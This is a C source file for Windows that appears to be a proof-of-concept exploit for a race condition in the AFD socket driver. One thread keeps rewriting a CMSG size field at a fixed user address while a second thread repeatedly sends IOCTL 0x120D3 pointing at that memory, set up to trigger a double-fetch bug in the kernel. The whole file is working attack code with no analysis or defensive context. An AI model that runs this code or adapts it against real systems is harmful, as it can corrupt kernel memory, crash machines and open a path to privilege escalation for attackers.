#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include<stdio.h>
#include<winsock2.h>
#include<windows.h>

#pragma comment(lib, "Ws2_32.lib")

// continuously change size of CMSG
DWORD WINAPI Thread2(LPVOID lpParam) {
	while (1) {
		*(DWORD*)0x1000000 = 0x58;
		for (int i = 0; i < 500; i++);
		*(DWORD*)0x1000000 = 0xfffffff8;
	}
}

DWORD WINAPI Thread1(LPVOID lpParam) {
	WSADATA WSAData;
	SOCKET s;
	SOCKADDR_IN sa;
	int ierr;

	WSAStartup(0x2, &WSAData);
	s = socket(AF_INET, SOCK_DGRAM, 0);
	memset(&sa, 0, sizeof(sa));
	sa.sin_port = htons(135);
	sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	sa.sin_family = AF_INET;
	ierr = bind(s, (SOCKADDR*)&sa, sizeof(sa));

	char outBuf[100];
	DWORD bytesRet;
	DWORD inbuf1[100];

	VirtualAlloc((LPVOID)0x1000000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	CreateThread(NULL, 0, Thread2, NULL, 0, NULL);


	while (1) {
		memset(inbuf1, 0, sizeof(inbuf1));
		*(DWORD*)0x1000000 = 0x58;
		inbuf1[0] = 16;
		inbuf1[1] = 0x1;
		inbuf1[2] = 0x0;
		inbuf1[0x1c / 4] = 0x1;
		inbuf1[0x20 / 4] = 0x1;
		inbuf1[0x18 / 4] = 0x1;
		inbuf1[6] = 0x1000000;
		inbuf1[7] = 0x58;

		// Send IO request to afd
		ierr = DeviceIoControl((HANDLE)s, 0x120D3, (LPVOID)inbuf1, 0x30, outBuf, 0, &bytesRet, NULL);
	}
}

int main() {
	HANDLE hThread1;
	HANDLE hThread2;

	hThread1 = CreateThread(NULL, 0, Thread1, NULL, 0, NULL);
	printf("[+] Setup successful, trigger race...\n");
	WaitForSingleObject(hThread1, INFINITE);
	return 0;
}